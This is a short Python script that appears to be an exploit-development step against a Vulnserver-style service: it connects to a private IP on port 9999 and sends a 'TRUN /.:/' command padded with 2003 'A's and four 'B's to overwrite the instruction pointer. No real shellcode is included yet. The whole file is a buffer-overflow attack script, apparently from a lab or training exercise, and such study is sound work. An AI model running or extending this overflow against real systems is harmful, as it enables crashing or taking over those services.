#!/usr/bin/python

import sys, socket

shellcode="A"*2003 + "B"*4#in python, a char takes 1 byte so 4 char= 4 bytes

try:
    payload = "TRUN /.:/" + shellcode
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.29.230',9999))
    s.send((payload.encode()))
    #s.send(("TRUN /.:/" + shellcode))
    s.close()
        
except:
    print("Error connecting to the server")
    sys.exit()	
